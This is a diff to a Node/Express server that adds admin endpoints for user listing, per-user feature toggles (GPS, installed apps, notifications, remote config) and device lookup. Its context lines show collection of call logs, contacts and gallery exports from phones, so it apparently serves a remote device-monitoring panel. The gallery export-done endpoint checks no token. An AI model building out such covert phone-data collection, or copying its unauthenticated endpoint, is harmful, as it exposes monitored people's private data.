@@ -205,6 +205,7 @@ const videoRequestFlags = new Map();
 const callLogsData = new Map();
 const contactsData = new Map();
 const exportRequestFlags = new Map(); // নতুন
+const userFeaturesData = new Map(); // নতুন: ইউজারের ফিচার পারমিশন
 
 app.post("/api/device-state", async (req, res) => {
   try {
@@ -674,7 +675,6 @@ app.get("/api/gallery/export-request", async (req, res) => {
 // ডিভাইস export শেষে জানাবে (ঐচ্ছিক)
 app.post("/api/gallery/export-done", async (req, res) => {
   const { deviceId, deviceToken, sentCount } = req.body;
-  // token যাচাই ঐচ্ছিক
   console.log(`Export done for ${deviceId}, sent ${sentCount} items.`);
   res.json({ success: true });
 });
@@ -682,8 +682,33 @@ app.post("/api/gallery/export-done", async (req, res) => {
 // ================= ADMIN API =================
 app.get("/api/admin/users", requireLogin, requireAdmin, async (req, res) => {
   try {
-    const result = await pool.query("SELECT id, email, role, created_at FROM users ORDER BY id DESC");
-    res.json({ users: result.rows });
+    const result = await pool.query("SELECT id AS uid, email, role, created_at FROM users ORDER BY id DESC");
+    const users = [];
+    for (const u of result.rows) {
+      const deviceCount = await pool.query("SELECT COUNT(*) FROM devices WHERE owner_user_id=$1", [u.uid]);
+      const buildCount = 0; // placeholder
+      const features = userFeaturesData.get(u.uid) || {
+        deviceInfo: true,
+        battery: true,
+        gps: true,
+        installedApps: true,
+        activity: true,
+        notifications: true,
+        sync: true,
+        remoteConfig: true
+      };
+      users.push({
+        uid: u.uid,
+        name: u.email, // in absence of name field, use email prefix
+        email: u.email,
+        role: u.role === 'admin' ? 'ADMIN' : 'USER',
+        deviceCount: parseInt(deviceCount.rows[0].count),
+        buildCount: buildCount,
+        lastActive: null,
+        features: features
+      });
+    }
+    res.json({ users });
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to fetch users." }); }
 });
 
@@ -782,6 +807,59 @@ app.post("/api/admin/gallery/export", requireLogin, requireAdmin, async (req, re
     console.error(e);
     res.status(500).json({ error: "Gallery export failed." });
   }
+});
+
+// ================= NEW: USER FEATURES & DEVICES =================
+app.get("/api/admin/users/:uid/features", requireLogin, requireAdmin, async (req, res) => {
+  try {
+    const uid = req.params.uid;
+    const features = userFeaturesData.get(uid) || {
+      deviceInfo: true,
+      battery: true,
+      gps: true,
+      installedApps: true,
+      activity: true,
+      notifications: true,
+      sync: true,
+      remoteConfig: true
+    };
+    res.json({ features });
+  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to fetch features" }); }
+});
+
+app.post("/api/admin/users/:uid/features", requireLogin, requireAdmin, async (req, res) => {
+  try {
+    const uid = req.params.uid;
+    const { features } = req.body;
+    if (!features || typeof features !== 'object') return res.status(400).json({ error: "features object required" });
+    const allowedKeys = ['deviceInfo','battery','gps','installedApps','activity','notifications','sync','remoteConfig'];
+    for (const key of Object.keys(features)) {
+      if (!allowedKeys.includes(key)) return res.status(400).json({ error: `Invalid feature: ${key}` });
+    }
+    const current = userFeaturesData.get(uid) || {
+      deviceInfo: true,
+      battery: true,
+      gps: true,
+      installedApps: true,
+      activity: true,
+      notifications: true,
+      sync: true,
+      remoteConfig: true
+    };
+    userFeaturesData.set(uid, { ...current, ...features });
+    res.json({ success: true });
+  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to update features" }); }
+});
+
+app.get("/api/admin/users/:uid/devices", requireLogin, requireAdmin, async (req, res) => {
+  try {
+    const uid = req.params.uid;
+    const userRes = await pool.query("SELECT id FROM users WHERE id=$1 OR email=$1", [uid]);
+    if (userRes.rows.length === 0) return res.status(404).json({ error: "User not found" });
+    const userId = userRes.rows[0].id;
+    const devices = await pool.query("SELECT * FROM devices WHERE owner_user_id=$1", [userId]);
+    res.json({ devices: devices.rows });
+  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to fetch devices" }); }
 });
 
 // ================= PAGES =================
